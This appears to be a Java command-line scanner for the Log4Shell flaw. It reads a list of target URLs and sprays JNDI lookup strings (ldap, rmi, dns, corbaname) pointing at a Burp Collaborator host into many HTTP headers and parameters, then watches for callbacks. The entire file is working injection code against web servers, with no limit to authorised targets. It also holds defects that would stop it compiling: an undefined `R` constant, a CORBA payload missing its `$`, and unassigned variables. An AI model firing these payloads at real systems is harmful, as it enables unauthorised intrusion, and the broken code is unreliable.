import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import java.util.Scanner;
import java.io.File;
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.ArrayList;
import java.net.URLEncoder;

public class log4jscanner {

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        try {
            HttpClient client = HttpClients.createDefault();
            System.out.println("Enter the Burp Collaborator URL:");
            String oobPayload = scanner.nextLine();
            String payload = "";
            System.out.println("Enter the path to the file containing URLs (one per line):");
            String filePath = scanner.nextLine();
            ArrayList<String> urls = readUrlsFromFile(filePath);

            System.out.println("Do you want to add custom headers? (yes/no)");
            String useCustomHeaders = scanner.nextLine().trim().toLowerCase();
            String[] headersToUse;

            if ("yes".equals(useCustomHeaders)) {
                System.out.println("Enter your custom headers (comma-separated):");
                String customHeaders = scanner.nextLine();
                headersToUse = customHeaders.split(",");
            } else {
                headersToUse = new String[] {
                        "User-Agent",
                        "X-Api-Version",
                        "X-Requested-With",
                        "Referer",
                        "X-Forwarded-For",
                        "X-Forwarded-Host",
                        "X-Forwarded-Server",
                        "X-Custom-IP-Authorization",
                        "X-Original-URL",
                        "X-Rewrite-URL",
                        "X-Client-IP",
                        "X-Remote-IP",
                        "X-Remote-Addr",
                        "X-Host",
                        "X-Custom-Header",
                        "X-Forwarded",
                        "Forwarded-For",
                        "Forwarded",
                        "Via",
                        "True-Client-IP",
                        "X-Real-IP"
                };
            }
            System.out.println("What kind of JNDI lookup do you want to perform? (L = LDAP, C = CORBA, R = RMI, D = DNS)");
            String jndiinput = scanner.nextLine();
            if(jndiinput.equals("L"))
                payload = "${jndi:ldap://" + oobPayload + "}";
            else if(jndiinput.equals(R))
                payload = "${jndi:rmi://" + oobPayload + ":1099/customobject}";
            else if(jndiinput.equals("D"))
                payload = "${jndi:dns://" + oobPayload+"}";
            else if(jndiinput.equals("C"))
            {
                System.out.println("Do you want to use a custom port or Name Server? (Default port is 1050 and Default Name Server is NameServer). Y/N");
                String corbaask = scanner.nextLine();
                String corbaport;
                String corbaname;
                if(corbaask.equals("N"))
                {
                    corbaport = "1050";
                    corbaname = "NameServer";
                }
                else if(corbaask.equals("Y"))
                {
                        System.out.println("Enter your port and name server");
                        corbaport = scanner.nextLine();
                        corbaname = scanner.nextLine();
                }
                else
                {
                    System.out.println("Invalid input");
                    System.exit(0);
                }
                payload = "{jndi:corbaname://" + oobPayload +":"+corbaport+"/"+corbaname+"}";
            }
            else
            {
                System.out.println("Please provide a valid lookup request(L = LDAP, C = CORBA, R = RMI, D = DNS)");
                System.exit(0);
            }
            System.out.println("Enter parameter names (format: name1,name2):");
            String paramsInput = scanner.nextLine();
            String[] params = paramsInput.split(",");

            System.out.println("Do you want to send a GET or POST request? (G/P):");
            String requestType = scanner.nextLine().trim().toUpperCase();

            int requestCount = 0;
            for (String url : urls) {
                if ("P".equals(requestType)) {
                    sendPostRequest(client, url, headersToUse, params, payload);
                } else if ("G".equals(requestType)) {
                    sendGetRequest(client, url, headersToUse, params, payload);
                } else {
                    System.out.println("Invalid request type. Please enter 'G' for GET or 'P' for POST.");
                    continue;
                }

                requestCount++;
                if (requestCount % 10 == 0) {
                    System.out.println("Pausing for 5 seconds...");
                    Thread.sleep(5000);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            scanner.close();
        }
        System.out.println("End");
    }

    private static ArrayList<String> readUrlsFromFile(String filePath) throws Exception {
        ArrayList<String> urls = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(new File(filePath)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                urls.add(line.trim());
            }
        }
        System.out.println(urls.size()+" Count of urls");
        return urls;
    }

    private static void sendPostRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
        HttpPost postRequest = new HttpPost(url);
        postRequest.setHeader("Content-type", "application/x-www-form-urlencoded");

        StringBuilder formData = new StringBuilder();
        for (String param : params) {
            if (formData.length() > 0) formData.append("&");
            String key = param;
            formData.append(URLEncoder.encode(key, "UTF-8"))
                    .append("=")
                    .append(URLEncoder.encode(payload, "UTF-8"));
        }

        for (String header : headers) {
            postRequest.setHeader(header.trim(), payload);
        }

        StringEntity requestEntity = new StringEntity(formData.toString());
        postRequest.setEntity(requestEntity);

        printRequestHeaders(postRequest);
        HttpResponse response = client.execute(postRequest);
        printResponseDetails(response);
    }

    private static void sendGetRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
        StringBuilder urlWithParams = new StringBuilder(url);
        urlWithParams.append("?");
        for (String param : params) {
            if (urlWithParams.charAt(urlWithParams.length() - 1) != '?') urlWithParams.append("&");
            String key = param;
            urlWithParams.append(URLEncoder.encode(key, "UTF-8"))
                    .append("=")
                    .append(URLEncoder.encode(payload, "UTF-8"));
        }

        HttpGet getRequest = new HttpGet(urlWithParams.toString());
        for (String header : headers) {
            getRequest.setHeader(header.trim(), payload);
        }

        printRequestHeaders(getRequest);
        HttpResponse response = client.execute(getRequest);
        printResponseDetails(response);
    }

    private static void printRequestHeaders(HttpGet getRequest) {
        System.out.println("The GET request sent is:");
        System.out.println(getRequest);
        for (int i = 0; i < getRequest.getAllHeaders().length; i++) {
            System.out.println(getRequest.getAllHeaders()[i]);
        }
    }

    private static void printRequestHeaders(HttpPost postRequest) {
        System.out.println("The POST request sent is:");
        System.out.println(postRequest);
        for (int i = 0; i < postRequest.getAllHeaders().length; i++) {
            System.out.println(postRequest.getAllHeaders()[i]);
        }
    }

    private static void printResponseDetails(HttpResponse response) throws Exception {
        System.out.println("HTTP Response Code: " + response.getStatusLine().getStatusCode());
        System.out.println("Response Body: " + EntityUtils.toString(response.getEntity()));
    }
}
                                                                                                                                     